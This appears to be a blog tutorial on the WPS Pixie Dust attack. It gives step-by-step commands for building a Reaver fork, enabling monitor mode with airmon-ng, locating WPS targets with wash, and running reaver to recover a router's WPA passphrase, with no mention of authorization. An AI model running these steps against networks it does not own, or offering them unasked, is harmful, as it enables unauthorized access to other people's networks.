---
title: WPS Pixie Dust Attack
date: 2025-04-26 00:00:00 +/-TTTT
categories:
  - Others
tags:
  - wps
  - pixie-dust
  - airmon-ng
  - wash
  - reaver
image: preview-image.png
media_subpath: /assets/img/Others/2025-05-31-wps-pixie-dust-attack/
---


## What is WPS?

**Wifi Protected Setup** (WPS) is an optional certification program from the Wi-Fi Alliance that is designed to ease the task of setting up and configuring security on wireless local area networks. Wi-Fi Protected Setup enables typical users who possess little understanding of traditional Wi-Fi configuration and security settings to automatically configure new wireless networks, add new devices and enable security.

## Now what is a Pixie Dust Attack?

A **Pixie-Dust** **attack** works by brute-forcing the key for a protocol called WPS. WPS was intended to make accessing a **router** easier, and it did – for attackers. The protocol uses an 8-digit PIN that can be cracked using a mathematical flaw in the handshake process. This allows attackers to gain access to the network without needing the Wi-Fi password. Once the PIN is retrieved, the attacker can connect to the router and bypass encryption, compromising the network's security.

## Introduction to Reaver

Reaver is an open-source tool for performing brute force attack against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases. This tool has been designed to be a robust and practical and has been tested against a wide variety of access points and WPS implementations.

The original Reaver performs a brute force attack against the AP, attempting every possible combination in order to guess the AP’s 8 digit pin number. Depending on the target’s Access Point (AP), Reaver will recover the AP’s plain text WPA / WPA2 passphrase in 4-10 hours, on average. But If you are using offline attack and the AP is vulnerable, it may take only a few seconds/minutes.

## Attack

### Step 1 : Download All Dependencies

It’s important to download all dependencies from the repository before proceeding with the attack. Kali Linux includes some of these, but if you’re using another flavor of Linux, it may not. So let’s go through all of them.

First, type into the terminal:

```bash
sudo apt-get update
```

Then:

```bash
sudo apt-get install build-essential libpcap-dev sqlite3 libsqlite3-dev pixiewps
```

### Step 2 : Clone the GitHub

This attack works by using a fork of Reaver. We’ll need to download, compile, and install the fork. Let’s begin:

* [https://github.com/t6x/reaver-wps-fork-t6x](https://github.com/t6x/reaver-wps-fork-t6x)

```bash
git clone https://github.com/t6x/reaver-wps-fork-t6x
```

### Step 3 : Installation

From your current working directory, type…

```bash
cd reaver-wps-fork-t6x/
cd src/
./configure
make
make install
```

or `sudo make install` if you’re not logged in as root.

### Step 4 : Monitor Mode

Put your interface into monitor mode using

```bash
airmon-ng start {monitor-interface}
```

![](2025-05-31-wps-pixie-dust-attack-1.png)

### Step 5: Find a Target

The easiest way to find a target with WPS enabled is

```bash
wash -i {monitor-interface}
```

Gather the BSSID and channel for the router you want to attack. Make sure you have a strong signal before attempting this attack.

![](2025-05-31-wps-pixie-dust-attack-2.png)

### Step 6 : Launch the Attack

Once you have all the information, simply type in the following command:

```bash
reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
```

![](2025-05-31-wps-pixie-dust-attack-3.png)

### Step 7 : Get the Password

There’s the password! Again, this attack won’t work against all routers, but it is definitely more effective than a brute force attack (Pixie Dust: maximum 30 minutes vs Brute Force: minutes to DAYS!)

![](2025-05-31-wps-pixie-dust-attack-4.png)
